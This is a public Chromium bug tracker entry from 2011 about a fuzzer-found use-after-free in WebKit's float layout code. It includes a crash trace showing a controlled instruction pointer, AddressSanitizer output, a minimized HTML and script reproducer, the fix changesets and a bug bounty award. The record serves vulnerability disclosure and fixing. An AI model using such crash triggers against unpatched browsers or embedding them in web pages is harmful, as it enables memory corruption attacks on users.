# Use after free due to floats not cleared from parent's next siblings blocks (on losing ability to intrude floats)

| Field | Value |
|-------|-------|
| **Issue ID** | [40091958](https://issues.chromium.org/issues/40091958) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-06-17 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

html parsing -> bad $rip

**VERSION**  

Chrome Version: all  

Operating System: all

**REPRODUCTION CASE**  

attached

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:  

Bad permissions for mapped region at address 0x4141414141414141  

at 0x4141414141414141: ???  

by 0x1C2B6F2: WebCore::RenderBlock::addOverflowFromFloats() (RenderBlock.h:508)  

by 0x1C2B75A: WebCore::RenderBlock::computeOverflow(int, bool) (RenderBlock.cpp:1367)

ERROR: AddressSanitizer crashed on unknown address 0x0000000000000000 at pc 0x0 bp 0x7fffa4c0ce90 sp 0x7fffa4c0cd98  

AddressSanitizer can not provide additional info. ABORTING

:|

## Attachments

- [vg.txt](attachments/vg.txt) (text/plain; charset=us-ascii, 9.0 KB)
- [yesh.html](attachments/yesh.html) (text/plain; charset=us-ascii, 501 B)

## Timeline

### in...@chromium.org (2011-06-17)

Thanks miaubiz.

More cleaned up test::

<div id="test1" style="width: 12px; position: relative">
    <span>
        <div id="test2">
            <p style="float: left"></p>
        </div>
    </span>
    <div id="test3">
        <span>
            <p>A A</p>
        </span>
    </div>
</div>
<script>
    document.body.offsetTop;
    test3.style.position = 'absolute';
    test2.style.position = 'absolute';
    document.body.offsetTop;
    test1.style.height = '1';
    test2.style.display = 'none';
</script>


### in...@chromium.org (2011-06-17)

filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=62875

### in...@chromium.org (2011-06-17)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-06-17)

Fixed in http://trac.webkit.org/changeset/89165

Miaubiz, please keep continuing your awesome fuzzing on the floats area.

### sc...@gmail.com (2011-06-17)

@miaubiz might be the last man standing in terms of successful Chrome fuzzing!

### sc...@gmail.com (2011-06-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-06-20)

M13: http://trac.webkit.org/changeset/89286

### mi...@gmail.com (2011-07-06)

@scarybeasts shit I think you jinxed me!#!"

### sc...@gmail.com (2011-07-20)

@miaubiz: apologies for the brevity in the following slew of rewards but you seem to have been rocking out recently. I also officially unjinx you.

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-07-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-09)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### gc...@google.com (2011-10-13)

+Steve Block

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/86502?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091958)*
